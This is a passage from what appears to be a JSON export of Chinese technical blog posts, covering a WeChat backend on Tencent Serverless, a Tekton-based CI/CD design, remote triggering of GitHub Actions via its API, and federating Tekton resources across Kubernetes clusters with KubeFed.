import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/yaotian/gowechat\u0026#34; \u0026#34;github.com/yaotian/gowechat/mp/message\u0026#34; \u0026#34;github.com/yaotian/gowechat/wxcontext\u0026#34; ) func main() { router := gin.Default() router.Any(\u0026#34;/mp/\u0026#34;, hello) router.Any(\u0026#34;/\u0026#34;, func(c *gin.Context) { c.String(http.StatusOK, \u0026#34;OK\u0026#34;) }) router.Run(\u0026#34;:9000\u0026#34;) } func hello(c *gin.Context) { //配置微信参数 config := wxcontext.Config{ AppID: \u0026#34;从公众号管理页获取\u0026#34;, AppSecret: \u0026#34;从公众号管理页获取\u0026#34;, Token: \u0026#34;从公众号管理页获取\u0026#34;, EncodingAESKey: \u0026#34;从公众号管理页获取\u0026#34;, } wc := gowechat.NewWechat(config) mp, err := wc.MpMgr() if err != nil { return } // 传入request和responseWriter msgHandler := mp.GetMsgHandler(c.Request, c.Writer) //设置接收消息的处理方法 msgHandler.SetHandleMessageFunc(func(msg message.MixMessage) *message.Reply { //回复消息：演示回复用户发送的消息 text := message.NewText(msg.Content) text.Content = \u0026#34;I get a msg : \u0026#34; + text.Content return \u0026amp;message.Reply{message.MsgTypeText, text} }) //处理消息接收以及回复 err = msgHandler.Handle() if err != nil { fmt.Println(err) return } } 代码实现的效果是，响应用户的输入 xxx，返回消息 I get a msg : xxx, 服务端配置在 /mp/ 路径上。\n需要特别注意的是端口需要监听 9000，否则 Serverless 无法响应\n3.2 添加 Dockerfile Dockerfile 内容如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ARG GO_VERSION=1.16 FROM golang:${GO_VERSION}-alpine AS builder RUN apk update \u0026amp;\u0026amp; apk add alpine-sdk git \u0026amp;\u0026amp; rm -rf /var/cache/apk/* RUN mkdir -p /builder WORKDIR /builder COPY go.mod . COPY go.sum . RUN go mod download COPY . . RUN go build -o ./app ./main.go FROM alpine:latest RUN apk update \u0026amp;\u0026amp; apk add ca-certificates \u0026amp;\u0026amp; rm -rf /var/cache/apk/* WORKDIR / COPY --from=builder /builder/app . EXPOSE 9000 分阶段构建, 将代码编译到 alpine:latest 镜像中, 可执行文件为 /app, 暴露的端口为 9000。\n3.3 添加 Github Action 为了方便持续集成，在仓库中新增文件 .github/workflows/build.yaml , 内容如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 name: Go on: push: branches: - \u0026#34;main\u0026#34; jobs: build: name: Build runs-on: ubuntu-latest env: GO111MODULE: on steps: - name: Check out code into the Go module directory uses: actions/checkout@v2 - name: Set up Go 1.16 uses: actions/setup-go@v2 with: go-version: 1.16 - name: Login Resigtry if: github.event_name == \u0026#39;push\u0026#39; run: | echo ${{ secrets.REGISTRY_PASSWORD }} | docker login ccr.ccs.tencentyun.com -u ${{ secrets.REGISTRY_USERNAME }} --password-stdin - name: Build run: | docker build -t ccr.ccs.tencentyun.com/shaowenchen/xxx -f ./Dockerfile . docker push ccr.ccs.tencentyun.com/shaowenchen/xxx:latest 提交代码之后，Github Action 自动编译代码，推送镜像到腾讯云的镜像仓库。\n4. 公众号配置及测试 4.1 启用公众号服务器配置 如上图，在微信公众号的管理页面，启用服务配置。需要记下如下信息，用于后端代码代码鉴权:\nAppID AppSecret Token EncodingAESKey 这里的服务器地址就是函数服务的网关地址 https://service-xxx.gz.apigw.tencentcs.com/release/ + mp/ 。由于服务尚未更新，验证无法通过，需要停留在这个页面，等待服务就绪再保存即可。\n4.2 配置秘钥更新服务 将上一步获取到的配置填写到 main.go 文件的配置中:\n1 2 3 4 5 6 config := wxcontext.Config{ AppID: \u0026#34;从公众号管理页获取\u0026#34;, AppSecret: \u0026#34;从公众号管理页获取\u0026#34;, Token: \u0026#34;从公众号管理页获取\u0026#34;, EncodingAESKey: \u0026#34;从公众号管理页获取\u0026#34;, } 提交之后，等待 Github Action 执行完毕，推送镜像成功。\n4.3 更新函数服务 虽然服务镜像更新成功，但是函数服务并不会更新。\n如上图，我们打开函数管理的页面，选择镜像版本，勾选 latest 提交。提交成功之后，页面会提示拉取镜像、服务更新中，此时打开访问地址，页面响应 OK。\n此时再去报错公众号服务配置，即可成功。\n4.4 发送消息测试 最后，在微信公众号测试一下功能:\n在腾讯云的函数服务后端，也可以查看到相关的请求日志。\n5. 总结 本文主要以微信公众号后端开发为需求，尝试了一下腾讯云 Serverless 服务。由于目前，腾讯云 Serverless 服务有一定的免费额度，对于个人的一些小项目、Demo 项目，也算够用。本文主要涉及如下内容:\n创建了一个腾讯云 Serverless 函数服务 使用 Github Action 创建了一个 Gin 持续集成项目 微信公众号服务器端配置 最终实现了一个能自动响应用户公众号消息输入的功能需求。\n","description":"","id":209,"section":"post","tags":["博文","GitHub","CICD","Serverless","微信"],"title":"使用腾讯云 Serverless 开发公众号后端","uri":"https://www.chenshaowen.com/blog/develop-a-wechat-backend-using-tencent-serverless.html"},{"content":"1.背景 1.1 目前使用 Jenkins 遇到的问题 编排引擎不稳定 Jenkins 是由 Java 编写的编排引擎，在 Full GC 时会 Stop The World(STW)。在大规模构建时，STW 可能会导致 Jenkins 无法处理新的请求。\n大量构建卡顿 Jenkins 使用磁盘文件存储数据，每条流水线、每次构建都会占用一个文件目录，产生大量文件。通常流水线数量有限，但在构建达到 10000+ 级别时，会感受到 IO 对 Jenkins 的影响。\n开发插件成本高 虽然 Jenkins 已经有很多的插件，但是面对内部庞大的各种系统，CICD 系统依然有开发插件的需求。开发 Jenkins 插件，需要掌握 Java 语言，学习 Jenkins 的插件机制。开发插件就是以 Jenkins 的运行周期为切入点，对其进行扩展。首先根据需要扩展的功能，在 Jenkins Packages 文档中，找到扩展的类。然后，在插件的主类中 extends 扩展类，实现自己的业务逻辑。\n并发性能差 由于 Jenkins 本身的限制，在 Kubernetes 上无法运行多个副本。基于 Kubernetes 的 Jenkins 并发量，构建并发量最多达到 400 左右时会出现明显瓶颈，继续提升需要架构层面的较大优化升级。\n1.2 对 CICD 的诉求 跨网络 服务上云，但代码不能出公司。需要在云上组装，而在内网构建容器镜像。\n可大规模执行流水线 CICD 提供的是一次性运行时。CICD 是自动化系统，执行次数越多，意味着节省的人力时间越多。在未来，CICD 会承载越来越多的场景。集群安装、证书巡检\u0026hellip;\n零停机运维 之前编排引擎的维护主要集中在凌晨，因为每次重启 Jenkins，都需要花费数分钟时间，在这个时间段内，CICD 系统无法提供服务。\n较短时间交付，持续迭代 设计一个庞大而完善的系统并不是初衷，我们希望快速验证想法，投入使用，然后不断地快速迭代，优化并完善系统。\n2. 选型比较 2.1 一个好的 CICD 具备哪些特征 一个好的 CICD 工具应该具有如下特点:\nOuter DSL 简单易掌握 - User Inner DSL 高效易维护 - Developer 生态，能复用的原子要多 - Ecosystem 通过 UDE 可以给一个 CICD 工具评分，下面对常见的几个 CI 进行比较:\nJenkins Outer 是 Groovy 编写的 Jenkinsfile 文件，Inner 是 Java 编写的 Jenkins。UD 都不算好，Jenkins 难以维护，但插件庞大，E 大大加分。\nGitLab CI Outer 是 Yaml 编写的 .gitlab-ci.yml 描述文件，Inner 是 Ruby 编写的解析引擎，使用 Go 写的 Runner。U 很好，上手很快，之前也写过一些文档，GitLab。D 不算好，Ruby 性能一般，会的人越来越少。E 就比较糟糕了，虽然有类似 Jenkins share library 的 template 提供原子级别的复用，但跨团队的复用率很低，不利于构筑社区生态。\nTekton Outer 是 Yaml 编写的 PipelineRun 描述，Inner 是 Go 编写的 Controller，不断地在 Kubernetes Pod 上执行编排流程。插件方面，目前 Tekton 社区提供有一百多个插件以供复用。\n2.2 Tekton vs Jenkins 在最近几年的编排引擎市场份额调查中，Jenkins 连续多年超过一半的使用率，这是 Jenkins 近 20 年积累、头部虹吸效应的结果。但进入云原生时代之后，基础设施发生了变化，Jenkins 并没有很好的跟上脚步，Jenkins X 放弃 Jenkins 转而使用 Tekton 作为默认编排引擎。而自研编排引擎成本过大，因此，这里主要将 Jenkins 与 Tekton 进行对比：\n功能 Jenkins Tekton 编程语言 Java Golang 开发插件语言 Java Shell、Yaml 流水线描述语言 Groovy、Shell Yaml、Shell 插件生态 很多插件，LDAP、GitLab 不足 插件数量 1500+ 100+ 插件之间的兼容性 可能会有冲突，不能随便升级 完全兼容 二次开发 封装 Api 组合 Task 是否高可用 集成 Gearman、主从模式 依赖 Kuberntes 的高可用 单实例并发构建规模 几百并发 依赖 Kuberntes 的 Pod 管理能力，可以很大 数据存储 本地磁盘 Etcd 是否支持自动触发 支持 支持 是否有商业支持 无 无 3. 基于 Tekton 的解决方案 3.1 Tekton 包含哪些组件 Pipeline CI/CD 工作流程的基础模块，用来创建任务、流水线。\nTriggers CI/CD 工作流程的事件触发器，可以用来根据事件自动触发流水线。\nCLI 用于管理 CICD 工作流的命令行工具。\nDashboard 一个通用的流水线 Web 管理工具。\n3.2 Tekton 流水线由什么构成 上面是一个 Pipeline 的示意图。一个 Pipeline 通常由多个 Task 组成，一个 Task 具有一个独立 Pod 运行环境。这些 Task 串、并执行。而每个 Task 中，又有若干个 Step ，Step 是串行执行的。一个 Step 具有一个独立 Container 运行环境。\n下面是一个执行简单脚本的流水线示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 apiVersion: tekton.dev/v1beta1 kind: PipelineRun metadata: name: test-demo spec: pipelineSpec: tasks: - name: test-1 taskSpec: steps: - name: run image: alpine script: | echo \u0026#34;Hello World.\u0026#34; 3.3 支持多集群构建 支持多集群能能显著增强 CICD 的可扩展性、可维护性。Tekton 已经将所有资源 CRD 抽象，这意味着我们借助于 KubeFed v2、Karmada、Open Cluster Management 等开源组件，可以非常容易实现流水线资源在多集群下的分发。\n如上图，我们将全部流水线资源创建在 host 集群，用于元数据的管理。然后通过开源的多集群管理方案，对不同集群上的资源进行分发。每个集群是一个单独的构建环境，这样能够有效地分散 CICD 流水线带来的负载压力。\n按照目前的资源规划，公司内网的服务器资源非常有限，我们需要尽可能使用云上的资源进行组装。host 集群、部分 worker 集群在公网，而执行 CI 构建的集群必须在内网。\n这里需要将 host 集群与 worker 集群之间能够网络打通。通过隧道打通网络是危害内网安全的操作，因此利用开源多集群组件实现不具备可行性。但我们并未就此止步，这种设计给了我们启发。\n3.4 实现的架构 如上图，是一个我们目前实现、并准备继续优化的架构。主要分为三个部分:\nweb 提供用户操作界面，通过图形化的方式编辑、描述流水线。\napiserver 提供 web API 接口、worker 拉取任务的接口\nworker 拉取当前集群的流水线任务、执行并推送结果\n用户在 web 端创建流水线，通过 Apiserver 保存在 DB，同时产生一条同步事件。Worker 通过轮询的方式，从 Apiserver 拉取消息队列中的同步任务，接着在当前集群执行。执行完成之后，将执行的结果和相关的日志推送 Apiserver 保存至 DB 中。最终，用户在页面上可以从 DB 中直接查看执行的结果。\n值得注意的是，一个集群上可以跑多个 worker 服务，对集群的要求也只是能连通 Apiserver，因此在公网、内网都可以接入 worker 集群进行构建。\n4. 总结与展望 4.1 功能丰富、性能优化 好用的产品是在需求之下不断地打磨出来的。我们会继续的收集大家对 CICD 的需求，并完善 CICD 系统。\n审批功能 流程控制是 CICD 必备的功能之一。通过 runAfter，可以控制 task 任务之间的执行顺序和依赖，但审批功能 Tekton 社区并没有提供解决方案。我们针对审批功能提供了两种方案，正在设计和实现中。\n接入物理机构建 由于目前主要服务于 web和后端项目的镜像构建，暂时没有提供物理机的接入。但我们已经考虑了方案，只等用户需求。\n子流水线 子流水线允许将一条流水线拆分成多个，不同的子流水线可以在不同的 worker 集群执行，同时可以更好的控制流程。\n流水线集群管理 目前的流水线后端是支持多集群的，但是前端暂时没有提供设置入口。支持多集群构建是这次设计的亮点之一，我们也希望能够尽快提供用户自助接入、自助管理、自助使用。\n4.2 承载更多功能的 CICD 系统 除了这次的具体设计实现，我还想聊一下对 CICD 系统的理解。通常，我们认为 CICD 系统只是用来做构建、发布。但实际上，CICD 提供的是一种运行时，与 Serverless 相对应。这种运行时，可以承载很多的应用场景，甚至替代一些 SaaS 。这里说两个场景：\n交付 在 Kubernetes 集群下，我们可以使用 Helm 进行交付应用。但是如何交付 Kubernetes 呢？面向 VM/裸金属服务器的服务如何交付呢？答案就是流水线。\n服务商通过 Task 插件封装各自的服务，提供给集成商。而集成商通流水线编排各种服务，面向客户提供交付的解决方案。\n自动化运维 1.故障处理\n2.增删节点\n3.申请资源\n4.服务变更\n\u0026hellip;\n","description":"","id":210,"section":"post","tags":["博文","CICD","DevOps","Tekton"],"title":"基于 Tekton 的 CICD 平台","uri":"https://www.chenshaowen.com/blog/a-cicd-system-based-on-tekton.html"},{"content":" 通常，我们需要在 GitHub 上进行一些操作，才能触发 GitHub Action。本篇将介绍一种通过 API 远程调用触发 GitHub Action 的方法。\n1. 常见的几种触发 GitHub Action 的方式 下面是一个 GitHub Action 的示例:\n1 2 3 4 5 6 7 name: GitHub Actions Demo on: [push, pull_request] jobs: Explore-GitHub-Actions: runs-on: ubuntu-latest steps: - run: echo \u0026#34;Hello World!\u0026#34; 在 on 关键字下，定义的就是触发 Workflow 执行的事件。下面常用的几种 GitHub Action 事件:\nworkflow_dispatch, 手动触发 在 inputs 中可以添加交互参数(可选)。\n1 2 3 4 5 6 7 on: workflow_dispatch: inputs: name: description: \u0026#39;Person to greet\u0026#39; required: true default: \u0026#39;Mona the Octocat\u0026#39; push, 推送代码 1 2 on: push issues, issues 生命周期 1 2 3 on: issues: types: [opened, edited, milestoned] issue_comment, issue 评论 1 2 3 on: issue_comment: types: [created, deleted] project, 项目管理生命周期 1 2 3 on: project: types: [created, deleted] pull_request, pr 生命周期 1 2 3 on: pull_request: types: [assigned, opened, synchronize, reopened] 利用这些事件 hook，可以自动化很多流程。\n2. 使用 API 远程触发 GitHub Action 2.1 创建一个 Token 访问链接页面 https://github.com/settings/tokens/new 申请一个 Token。\n需要勾选 repo 权限。\n2.2 添加 在仓库 https://github.com/shaowenchen/wait-webhook-to-run 下，新建一个文件 .github/workflows/worker.yml。内容如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 on: repository_dispatch: types: - webhook-1 - webhook-2 jobs: run: runs-on: ubuntu-latest steps: - name: Hello World run: | echo Hello World! 在 repository_dispatch 的 types 中，可以自定义事件类型。\n2.3 远程触发 Github Action 下面是 API 调用格式:\n1 2 3 4 curl -X POST https://api.github.com/repos/:owner/:repo/dispatches \\ -H \u0026#34;Accept: application/vnd.github.everest-preview+json\u0026#34; \\ -H \u0026#34;Authorization: token TRIGGER_TOKEN\u0026#34; \\ --data \u0026#39;{\u0026#34;event_type\u0026#34;: \u0026#34;TRIGGER_EVENT\u0026#34;}\u0026#39; 其中，owner 是用户名，repo 是仓库名， TRIGGER_TOKEN 是上面申请的 Token 凭证，TRIGGER_EVENT 是自定义的事件名。\n触发 webhook-1 事件 1 2 3 4 curl -X POST https://api.github.com/repos/shaowenchen/wait-webhook-to-run/dispatches \\ -H \u0026#34;Accept: application/vnd.github.everest-preview+json\u0026#34; \\ -H \u0026#34;Authorization: token ghp_xxxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34; \\ --data \u0026#39;{\u0026#34;event_type\u0026#34;: \u0026#34;webhook-1\u0026#34;}\u0026#39; 触发 webhook-2 事件 1 2 3 4 curl -X POST https://api.github.com/repos/shaowenchen/wait-webhook-to-run/dispatches \\ -H \u0026#34;Accept: application/vnd.github.everest-preview+json\u0026#34; \\ -H \u0026#34;Authorization: token ghp_xxxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34; \\ --data \u0026#39;{\u0026#34;event_type\u0026#34;: \u0026#34;webhook-2\u0026#34;}\u0026#39; 查看 GitHub Action 执行:\n3. 参考 https://docs.github.com/cn/actions/reference/events-that-trigger-workflows ","description":"","id":211,"section":"post","tags":["博文","GitHub","CICD","DevOps","工具","研发"],"title":"如何远程触发 GitHub Action","uri":"https://www.chenshaowen.com/blog/how-to-trigger-github-action-remotely.html"},{"content":"1. 多集群构建 Tekton 的优势 借助于 Kubernetes, Tekton 已经具备很好的弹性, 能够支持大规模构建。同时, 开发 Task 主要使用 Yaml 和 Shell, 这扩大了 Tekton 的各种场景适配范围。\n上面是一张 Tekton 在多集群下的示意图。为什么 Tekton 需要多集群执行流水线？\n随时可变的 Kubernetes 集群。单一的 Kubernetes 集群, 无法满足运维的要求, 不能随时对集群进行变更。多集群下, 可以下架部分集群进行维护。 更大规模的构建。CI 对 CPU、内存、IO 资源的消耗很大, 容易压垮节点甚至集群。多集群能有效分担负载压力，提高可用性。 业务隔离。业务对代码安全等级、构建速度、构建环境要求不一样, 多集群能够提供隔离的环境, 定制化的流水线服务。 2. Kubernetes Cluster Federation Kubernetes Cluster Federation 简称 KubeFed。KubeFed v2 相较于 v1 最大的改变是将 API Server 移除, 并且通过 CRD 机制完成 Federated Resource 的扩展。KubeFed Controller 管理这些 CRD, 并实现同步 Resources 跨集群编排等功能，实现模块化和定制化。下面是社区的架构图:\nKubeFed 配置了两种类型的信息：\nType configuration, 声明 KubeFed 处理的 API 类型 Cluster configuration, 声明 KubeFed 管理哪些集群 Type configuration 有三个基本概念：\nTemplates， 定义资源在集群中的模板描述 Placement， 定义资源需要分发到哪些集群 Overrides， 定义在集群中，需要覆盖 Templates 的字段内容 此外，通过 Status、Policy 和 Scheduling 可以实现更高级的功能:\nStatus 收集分发资源在各个集群中的状态 Policy 允许将资源分配给哪些集群的策略控制 Scheduling 允许资源跨集群迁移副本 除此，KubeFed 还提供了 MultiClusterDNS，可以用于多集群之间的服务发现。\n3. 联邦化 Kubernetes 集群 3.1 准备集群并配置 Context 这里部署两个集群: dev1 作为主集群，用来作为 Tekton 的控制面，不运行流水线任务; dev2 作为子集群，用来执行 Tekton 流水线任务。\n准备两个集群 主集群 dev1\n1 2 3 4 kubectl get node NAME STATUS ROLES AGE VERSION node1 Ready control-plane,master,worker 151m v1.20.4 1 2 3 helm version version.BuildInfo{Version:\u0026#34;v3.2.1\u0026#34;, GitCommit:\u0026#34;fe51cd1e31e6a202cba7dead9552a6d418ded79a\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, GoVersion:\u0026#34;go1.13.10\u0026#34;} 子集群 dev2\n1 2 3 4 kubectl get node NAME STATUS ROLES AGE VERSION node1 Ready control-plane,master,worker 42d v1.20.4 在主集群上配置全部集群的 Context(要求集群 Apiserver 入口在一个网络，能够直连)，用来添加子集群 这里 contexts 中的 name 不能含义 @ 等特殊字符, 否则 join 时会报错。因为 name 会用来创建 Secret, 需要符合 Kubernetes 的命名规范。\n将主集群 dev1 的 kubeconfig 放在 ~/.kube/config-1，并修改 name 等信息，格式如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 apiVersion: v1 clusters: - cluster: ... name: dev1.cluster.local contexts: - context: cluster: dev1.cluster.local user: dev1-kubernetes-admin name: dev1-context users: - name: dev1-kubernetes-admin user: ... 将子集群 dev2 的 kubeconfig 放在 ~/.kube/config-2，并修改 name 等信息，格式如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 apiVersion: v1 clusters: - cluster: ... name: dev2.cluster.local contexts: - context: cluster: dev2.cluster.local user: dev2-kubernetes-admin name: dev2-context users: - name: dev2-kubernetes-admin user: ... 合并 kubeconfig 1 2 cd $HOME/.kube/ KUBECONFIG=config-1:config-2 kubectl config view --flatten \u0026gt; $HOME/.kube/config 查看添加的集群 Context 1 2 3 4 5 kubectl config get-contexts CURRENT NAME CLUSTER AUTHINFO NAMESPACE dev1-context dev1.cluster.local dev1-kubernetes-admin dev2-context dev2.cluster.local dev2-kubernetes-admin 切换到主集群 dev1 1 2 3 kubectl config use-context dev1-context Switched to context \u0026#34;dev1-context\u0026#34;. 3.2 在主集群上安装 KubeFed 使用 Helm 安装 KubeFed 1 2 3 git clone https://github.com/kubernetes-sigs/kubefed.git cd kubefed/charts/ helm install kubefed ./kubefed/ --namespace kube-federation-system --create-namespace 查看负载 1 2 3 4 5 6 7 8 9 10 kubectl get deploy,pod -n kube-federation-system NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/kubefed-admission-webhook 1/1 1 1 95s deployment.apps/kubefed-controller-manager 2/2 2 2 95s NAME READY STATUS RESTARTS AGE pod/kubefed-admission-webhook-598bd776c6-gv4qh 1/1 Running 0 95s pod/kubefed-controller-manager-6d9bf98d74-n8kjz 1/1 Running 0 17s pod/kubefed-controller-manager-6d9bf98d74-nmb2j 1/1 Running 0 14s 3.3 在主集群上安装 kubefedctl 执行命令:\n1 2 3 wget https://github.com/kubernetes-sigs/kubefed/releases/download/v0.8.0/kubefedctl-0.8.0-linux-amd64.tgz tar -zxvf kubefedctl-*.tgz mv kubefedctl /usr/local/bin/ 3.4 添加集群 在主集群上执行命令, 将 dev1、dev2 都添加到主集群 dev1 上。\n1 2 3 4 5 kubefedctl join dev1-context --host-cluster-context dev1-context --kubefed-namespace=kube-federation-system --v=2 I0625 14:32:42.969373 25920 join.go:861] Using secret named: dev1-context-dev1-context-token-2w8km I0625 14:32:42.972316 25920 join.go:934] Created secret in host cluster named: dev1-context-ln6vx I0625 14:32:42.991399 25920 join.go:299] Created federated cluster resource 1 2 3 4 5 kubefedctl join dev2-context --host-cluster-context dev1-context --kubefed-namespace=kube-federation-system --v=2 I0625 14:33:11.836472 26424 join.go:861] Using secret named: dev2-context-dev1-context-token-dcl8s I0625 14:33:11.840121 26424 join.go:934] Created secret in host cluster named: dev2-context-264dz I0625 14:33:11.898044 26424 join.go:299] Created federated cluster resource 查看集群列表:\n1 2 3 4 5 kubectl -n kube-federation-system get kubefedclusters NAME AGE READY dev1-context 45s True dev2-context 16s True 3.5 测试集群是否联邦成功 查看已经联邦化的资源 安装 KubeFed 之后，常见的很多资源都已经联邦化，可以在 CRD 中查看:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl get crd |grep federated federatedclusterroles.types.kubefed.io 2021-06-26T06:22:50Z federatedconfigmaps.types.kubefed.io 2021-06-26T06:22:50Z federateddeployments.types.kubefed.io 2021-06-26T06:22:50Z federatedingresses.types.kubefed.io 2021-06-26T06:22:50Z federatedjobs.types.kubefed.io 2021-06-26T06:22:50Z federatednamespaces.types.kubefed.io 2021-06-26T06:22:50Z federatedreplicasets.types.kubefed.io 2021-06-26T06:22:50Z federatedsecrets.types.kubefed.io 2021-06-26T06:22:50Z federatedserviceaccounts.types.kubefed.io 2021-06-26T06:22:50Z federatedservices.types.kubefed.io 2021-06-26T06:22:50Z federatedservicestatuses.core.kubefed.io 2021-06-26T06:22:50Z federatedtypeconfigs.core.kubefed.io 2021-06-26T06:22:50Z 在 federatedtypeconfigs 中也可以看到已经开启联邦的资源。\n1 2 3 4 5 6 7 8 9 10 11 12 13 kubectl get federatedtypeconfigs.core.kubefed.io -n kube-federation-system NAME AGE clusterroles.rbac.authorization.k8s.io 29m configmaps 29m deployments.apps 29m ingresses.extensions 29m jobs.batch 29m namespaces 29m replicasets.apps 29m secrets 29m serviceaccounts 29m services 29m 创建一个联邦的 Namespace Namespace 级别的资源需要放置在联邦化的 Namespace 下，否则在进行资源分发时，Controller 会报错。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 apiVersion: v1 kind: Namespace metadata: name: testing-fed --- apiVersion: types.kubefed.io/v1beta1 kind: FederatedNamespace metadata: name: testing-fed namespace: testing-fed spec: placement: clusters: - name: dev1-context - name: dev2-context 在主集群创建一个联邦的 Deployment 常见的 Deployment 是这样:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 apiVersion: apps/v1 kind: Deployment metadata: name: nginx namespace: default spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - image: nginx name: nginx 而联邦的 Deployment 是这样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 apiVersion: types.kubefed.io/v1beta1 kind: FederatedDeployment metadata: name: nginx-fed namespace: testing-fed spec: overrides: - clusterName: dev1-context clusterOverrides: - path: /spec/replicas value: 2 - clusterName: dev2-context clusterOverrides: - path: /spec/replicas value: 3 placement: clusters: - name: dev1-context - name: dev2-context template: metadata: labels: app: nginx namespace: testing-fed spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - image: nginx name: nginx FederatedDeployment 编写时，需要注意三个字段\n- overrides, 根据不同集群, 需要覆盖的字段属性。这里将 dev1 上的副本数改为 2，而将 dev2 上的副本数改为 3。 - placement, 资源需要放置的集群列表。这里放置在 dev1、dev2 两个集群。 - template, 资源的模板。这里是 Deployment 去掉 apiVersion 和 kind 的剩余部分。 验证资源是否分发成功 在 dev1 集群上\n1 2 3 4 5 kubectl -n testing-fed get pod NAME READY STATUS RESTARTS AGE nginx-fed-6799fc88d8-7llk9 1/1 Running 0 8m2s nginx-fed-6799fc88d8-clc5w 1/1 Running 0 8m2s 在 dev2 集群上\n1 2 3 4 5 6 kubectl -n testing-fed get pod NAME READY STATUS RESTARTS AGE nginx-fed-6799fc88d8-2ld4k 1/1 Running 0 7m49s nginx-fed-6799fc88d8-6dncp 1/1 Running 0 7m49s nginx-fed-6799fc88d8-x64fb 1/1 Running 0 7m49s 4. 联邦化 Tekton 的 CRD 资源 4.1 安装 Tekton 在所有集群上都需要安装 Tekton\n1 kubectl apply -f https://raw.githubusercontent.com/shaowenchen/image-syncer/main/tekton/v0.24.1-release-0.24.1.yaml 由于 Tekton 社区使用的是 gcr.io 的镜像, 有些主机环境上可能无法拉取。我在 Dockerhub 上对其进行了备份, 在这里可以找到相关的 yaml, https://github.com/shaowenchen/image-syncer/tree/main/tekton 。\n4.2 联邦化 Tekton 的 CRD 安装 KubeFed 时, 会默认将常见的 Deployment、Secret 等联邦化, 但如果是用户自定义的 CRD 就需要手动开启。\n执行命令:\n1 2 3 4 5 6 7 8 kubefedctl enable clustertasks.tekton.dev kubefedctl enable conditions.tekton.dev kubefedctl enable pipelineresources.tekton.dev kubefedctl enable pipelineruns.tekton.dev kubefedctl enable pipelines.tekton.dev kubefedctl enable runs.tekton.dev kubefedctl enable taskruns.tekton.dev kubefedctl enable tasks.tekton.dev 以 taskruns 为例, kubefedctl enable taskruns.tekton.dev 会自动创建两个资源:\ncustomresourcedefinition.apiextensions.k8s.io/federatedtaskruns.types.kubefed.io, 联邦 CRD 资源 federatedtaskruns federatedtypeconfig.core.kubefed.io/taskruns.tekton.dev, 在 kube-federation-system 命名空间下, 创建 federatedtypeconfig 类型的资源 taskruns 开启资源分发使能 4.3 编辑新创建的联邦 CRD 资源添加字段 缺少这一步, 会导致同步到子集群的 CR 资源内容为空。因为 kubefedctl enable 联邦化 CRD 资源缺少 template 字段。\n执行命令:\n1 kubectl edit crd federatedtasks.types.kubefed.io 在与 overrides 、placement 平级的层次，添加下面示例的 template 内容即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 apiVersion: apiextensions.k8s.io/v1 ... spec: versions: - name: v1beta1 schema: openAPIV3Schema: properties: spec: properties: overrides: ... placement: ... template: type: object x-kubernetes-preserve-unknown-fields: true type: object 如果觉得不够清晰，可以参考 https://github.com/shaowenchen/demo/tree/master/tekton-0.24.1-kubefed 修改。如果你也是使用版本 0.24.1, 可以直接 kubectl apply 这些 CRD 资源。\n4.4 测试多集群下分发 Tekton 对象 这里为了避免粘贴大量 yaml, 直接提前预先在子集群上创建 Task 资源, 而没有使用 FederatedTask 进行分发。\n在子集群上创建 Task 1 kubectl apply -f https://raw.githubusercontent.com/tektoncd/catalog/main/task/git-clone/0.4/git-clone.yaml -n testing-fed 在主集群 dev1 上创建 FederatedTaskRun 资源分发到子集群 dev2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 apiVersion: types.kubefed.io/v1beta1 kind: FederatedTaskRun metadata: name: git-clone-test namespace: testing-fed spec: placement: clusters: - name: dev2-context template: metadata: namespace: testing-fed spec: workspaces: - name: output emptyDir: {} taskRef: name: git-clone params: - name: url value: https://github.com/kelseyhightower/nocode 在子集群 dev2 上查看 Tekton 的 Taskrun 任务 1 2 3 4 kubectl get taskrun -n testing-fed NAME SUCCEEDED REASON STARTTIME COMPLETIONTIME git-clone-test True Succeeded 15s 7s 5. 总结 本文主要介绍并实践了利用 KubeFed 管理多集群，对 Tekton CRD 资源进行联邦化。\n多集群下的 Tekton，使用主集群管理资源，使用子集群执行流水线，能够有效均衡负载，增加流水线的并发执行量，提高 CICD 系统的可维护性。\n这里的 KubeFed 主要是用来存储并分发 Tekton 对象资源。如果自研编码，可以通过数据存储加循环控制器完成，但是利用 KubeFed Controller 能快速实现，同时避免了很多潜在的问题。KubeFed 用于做跨集群的资源分发，非常适用。\n6. 参考 https://github.com/kubernetes-sigs/kubefed ","description":"","id":212,"section":"post","tags":["Tekton","KubeFed","Kubernetes","多集群","博文"],"title":"多集群下的 Tekton 流水线","uri":"https://www.chenshaowen.com/blog/using-kubefed-to-distribute-tekton-resource-cross-cluster.html"},{"content":"1. 创建一个 Go Modules 项目 创建目录 1 2 mkdir go-test cd go-test 初始化包 1 2 3 4 5 go mod init gitlab.private.com/shaowenchen/go-test go: creating new go.mod: module gitlab.private.com/shaowenchen/go-test go: to add module requirements and sums: go mod tidy 添加业务代码 main.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; ) func main() { r := gin.Default() r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;hello world.\u0026#34;, }) }) r.Run() } 下载依赖到 vendor 1 2 go mod tidy go mod vendor 本地运行 1 2 3 4 5 go run main.go 